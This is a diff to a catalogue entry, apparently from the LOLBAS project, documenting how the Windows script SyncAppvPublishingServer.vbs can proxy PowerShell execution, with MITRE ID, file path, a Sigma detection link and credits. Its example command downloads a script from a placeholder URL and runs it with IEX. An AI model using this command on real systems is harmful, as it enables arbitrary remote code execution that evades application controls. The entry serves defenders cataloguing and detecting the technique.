@@ -2,7 +2,7 @@
 Name: Syncappvpublishingserver.vbs
 Description: Script used related to app-v and publishing server
 Author: 'Oddvar Moe'
-Created: '2018-05-25'
+Created: 2018-05-25
 Commands:
   - Command: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
     Description: Inject PowerShell script code with the provided arguments
@@ -10,14 +10,13 @@ Commands:
     Category: Execute
     Privileges: User
     MitreID: T1216
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1216
-    OperatingSystem: Windows 10
+    OperatingSystem: Windows 10, Windows 11
 Full_Path:
   - Path: C:\Windows\System32\SyncAppvPublishingServer.vbs
-Code_Sample: 
+Code_Sample:
   - Code:
 Detection:
-  - IOC:
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/973e0666acffb8fd7ea8356449eb916381ab0cc6/rules/windows/process_creation/process_creation_syncappvpublishingserver_vbs_execute_powershell.yml
 Resources:
   - Link: https://twitter.com/monoxgas/status/895045566090010624
   - Link: https://twitter.com/subTee/status/855738126882316288
@@ -26,4 +25,3 @@ Acknowledgement:
     Handle: '@monoxgas'
   - Person: Casey Smith
     Handle: '@subtee'
----
